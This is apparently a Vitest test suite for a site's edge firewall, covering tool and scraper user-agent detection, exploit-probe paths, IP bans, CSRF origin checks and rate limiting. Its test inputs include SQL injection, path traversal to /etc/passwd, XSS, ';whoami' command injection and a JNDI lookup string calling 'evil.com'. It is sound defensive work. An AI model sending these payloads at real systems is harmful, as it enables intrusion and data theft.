import { describe, it, expect, beforeEach } from "vitest";
import {
  isMaliciousTool,
  isScraperTool,
  isExploitProbe,
  detectInjection,
  validateMutationOrigin,
  validatePayloadSize,
  isIpBanned,
  banIp,
  unbanIp,
  recordOffense,
  clearAllBans,
  evaluateFirewall,
  checkEdgeRateLimit,
} from "@/lib/firewall";

describe("Edge Firewall & WAF Engine", () => {
  beforeEach(() => {
    clearAllBans();
  });

  describe("Malicious Tool Identification", () => {
    it("should detect known offensive penetration and attack tools", () => {
      expect(isMaliciousTool("sqlmap/1.5.2#stable (http://sqlmap.org)").malicious).toBe(true);
      expect(isMaliciousTool("Mozilla/5.0 (compatible; Nikto/2.1.6)").malicious).toBe(true);
      expect(isMaliciousTool("gobuster 3.1.0").malicious).toBe(true);
      expect(isMaliciousTool("dirbuster 1.0-RC1").malicious).toBe(true);
      expect(isMaliciousTool("WPScan v3.8.20").malicious).toBe(true);
      expect(isMaliciousTool("Nuclei - Vulnerability Scanner").malicious).toBe(true);
      expect(isMaliciousTool("masscan/1.0").malicious).toBe(true);
      expect(isMaliciousTool("Nmap Scripting Engine").malicious).toBe(true);
    });

    it("should allow regular browser user agents", () => {
      const chromeUA =
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      expect(isMaliciousTool(chromeUA).malicious).toBe(false);
      expect(isMaliciousTool(null).malicious).toBe(false);
    });
  });

  describe("AI & Content Scraper Identification", () => {
    it("should detect unauthorized AI and content scrapers", () => {
      expect(isScraperTool("Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)").scraper).toBe(true);
      expect(isScraperTool("Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)").scraper).toBe(true);
      expect(isScraperTool("CCBot/2.0 (https://commoncrawl.org/faq/)").scraper).toBe(true);
      expect(isScraperTool("Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)").scraper).toBe(true);
      expect(isScraperTool("PerplexityBot/1.0").scraper).toBe(true);
      expect(isScraperTool("Scrapy/2.8.0 (+https://scrapy.org)").scraper).toBe(true);
      expect(isScraperTool("Diffbot/0.1").scraper).toBe(true);
    });

    it("should allow legitimate search engines", () => {
      const googlebot = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
      expect(isScraperTool(googlebot).scraper).toBe(false);
    });
  });

  describe("Exploit Probe Paths", () => {
    it("should catch common vulnerability probe scans", () => {
      expect(isExploitProbe("/.env").probe).toBe(true);
      expect(isExploitProbe("/.env.local").probe).toBe(true);
      expect(isExploitProbe("/.git/config").probe).toBe(true);
      expect(isExploitProbe("/wp-admin/install.php").probe).toBe(true);
      expect(isExploitProbe("/wp-login.php").probe).toBe(true);
      expect(isExploitProbe("/phpmyadmin/index.php").probe).toBe(true);
      expect(isExploitProbe("/xmlrpc.php").probe).toBe(true);
      expect(isExploitProbe("/actuator/health").probe).toBe(true);
      expect(isExploitProbe("/dump.sql").probe).toBe(true);
      expect(isExploitProbe("/cgi-bin/test").probe).toBe(true);
    });

    it("should allow normal website paths", () => {
      expect(isExploitProbe("/").probe).toBe(false);
      expect(isExploitProbe("/about").probe).toBe(false);
      expect(isExploitProbe("/researchers/ali-jemo").probe).toBe(false);
      expect(isExploitProbe("/api/applications").probe).toBe(false);
    });
  });

  describe("WAF Injection Detection", () => {
    it("should detect SQL injection patterns", () => {
      expect(detectInjection("https://jemo.co/search?q=1%27%20UNION%20SELECT%20null,null--").detected).toBe(true);
      expect(detectInjection("https://jemo.co/items?id=1%20OR%201=1").detected).toBe(true);
      expect(detectInjection("https://jemo.co/items?id=1;%20DROP%20TABLE%20users--").detected).toBe(true);
      expect(detectInjection("https://jemo.co/api?q=benchmark(1000000,md5('a'))").detected).toBe(true);
      expect(detectInjection("https://jemo.co/api?q=sleep(5)").detected).toBe(true);
    });

    it("should detect Directory Traversal and LFI", () => {
      expect(detectInjection("https://jemo.co/files?path=../../../../etc/passwd").detected).toBe(true);
      expect(detectInjection("https://jemo.co/files?path=%2e%2e%2f%2e%2e%2fetc/passwd").detected).toBe(true);
    });

    it("should detect XSS and Remote Code Execution", () => {
      expect(detectInjection("https://jemo.co/profile?name=<script>alert(1)</script>").detected).toBe(true);
      expect(detectInjection("https://jemo.co/profile?name=javascript:alert(1)").detected).toBe(true);
      expect(detectInjection("https://jemo.co/exec?cmd=${jndi:ldap://evil.com/x}").detected).toBe(true);
      expect(detectInjection("https://jemo.co/exec?cmd=;whoami").detected).toBe(true);
      expect(detectInjection("https://jemo.co/files?path=test%00.jpg").detected).toBe(true);
    });

    it("should allow normal query strings", () => {
      expect(detectInjection("https://jemo.co/search?q=quantum%20computing&page=1").detected).toBe(false);
      expect(detectInjection("https://jemo.co/publications?author=jemo").detected).toBe(false);
    });
  });

  describe("IP Ban & Offense Threshold Management", () => {
    it("should ban and unban IPs correctly", () => {
      const testIp = "192.0.2.45";
      expect(isIpBanned(testIp).banned).toBe(false);

      banIp(testIp, "Manual ban test", 10_000);
      expect(isIpBanned(testIp).banned).toBe(true);
      expect(isIpBanned(testIp).reason).toBe("Manual ban test");

      unbanIp(testIp);
      expect(isIpBanned(testIp).banned).toBe(false);
    });

    it("should auto-ban after repeated strikes", () => {
      const testIp = "198.51.100.12";
      expect(recordOffense(testIp, "WAF violation").banned).toBe(false);
      expect(recordOffense(testIp, "WAF violation").banned).toBe(false);

      const thirdStrike = recordOffense(testIp, "WAF violation");
      expect(thirdStrike.banned).toBe(true);
      expect(isIpBanned(testIp).banned).toBe(true);
    });
  });

  describe("CSRF / Mutation Origin Validation", () => {
    it("should allow GET requests regardless of origin", () => {
      const req = new Request("https://jemo.co/api/content/initiatives", { method: "GET" });
      expect(validateMutationOrigin(req).valid).toBe(true);
    });

    it("should allow mutations matching valid origin", () => {
      const req = new Request("https://jemo.co/api/track", {
        method: "POST",
        headers: { origin: "https://jemo.co" },
      });
      expect(validateMutationOrigin(req).valid).toBe(true);
    });

    it("should reject mutations from unauthorized external origins", () => {
      const req = new Request("https://jemo.co/api/track", {
        method: "POST",
        headers: { origin: "https://attacker-site.com" },
      });
      const result = validateMutationOrigin(req);
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("attacker-site.com");
    });
  });

  describe("Payload Size Guard", () => {
    it("should permit normal payloads and reject oversize bodies", () => {
      const normalReq = new Request("https://jemo.co/api/track", {
        headers: { "content-length": "5000" },
      });
      expect(validatePayloadSize(normalReq, 10_000).valid).toBe(true);

      const massiveReq = new Request("https://jemo.co/api/track", {
        headers: { "content-length": "2000000" },
      });
      expect(validatePayloadSize(massiveReq, 1_000_000).valid).toBe(false);
    });
  });

  describe("Edge Rate Limiting & DoS Classification", () => {
    it("should throttle and auto-ban request flooding", () => {
      const floodIp = "203.0.113.88";
      // Normal allowed requests
      const r1 = checkEdgeRateLimit(floodIp, true);
      expect(r1.allowed).toBe(true);

      // Simulate DoS attack (> 150 requests within window)
      for (let i = 0; i < 160; i++) {
        checkEdgeRateLimit(floodIp, true);
      }

      const floodResult = checkEdgeRateLimit(floodIp, true);
      expect(floodResult.allowed).toBe(false);
      expect(floodResult.banned).toBe(true);
      expect(isIpBanned(floodIp).banned).toBe(true);
    });
  });

  describe("Unified Firewall Evaluation", () => {
    it("should block and blacklist IP when hitting honeypot", () => {
      const req = new Request("https://jemo.co/api/security/honeypot-trap", {
        headers: { "cf-connecting-ip": "198.51.100.99" },
      });

      const evaluation = evaluateFirewall(req);
      expect(evaluation.action).toBe("BLOCK");
      expect(evaluation.code).toBe("HONEYPOT_TRIGGERED");
      expect(isIpBanned("198.51.100.99").banned).toBe(true);
    });

    it("should block and blacklist IP when probing exploit paths", () => {
      const req = new Request("https://jemo.co/.env", {
        headers: { "cf-connecting-ip": "198.51.100.101" },
      });

      const evaluation = evaluateFirewall(req);
      expect(evaluation.action).toBe("BLOCK");
      expect(evaluation.code).toBe("EXPLOIT_PROBE_BLOCKED");
      expect(isIpBanned("198.51.100.101").banned).toBe(true);
    });

    it("should block requests with malicious tool user-agents", () => {
      const req = new Request("https://jemo.co/about", {
        headers: {
          "user-agent": "sqlmap/1.6#stable",
          "cf-connecting-ip": "198.51.100.102",
        },
      });

      const evaluation = evaluateFirewall(req);
      expect(evaluation.action).toBe("BLOCK");
      expect(evaluation.code).toBe("MALICIOUS_TOOL_BLOCKED");
    });

    it("should allow clean user traffic", () => {
      const req = new Request("https://jemo.co/publications", {
        headers: {
          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
          "cf-connecting-ip": "198.51.100.200",
        },
      });

      const evaluation = evaluateFirewall(req);
      expect(evaluation.action).toBe("ALLOW");
    });
  });
});
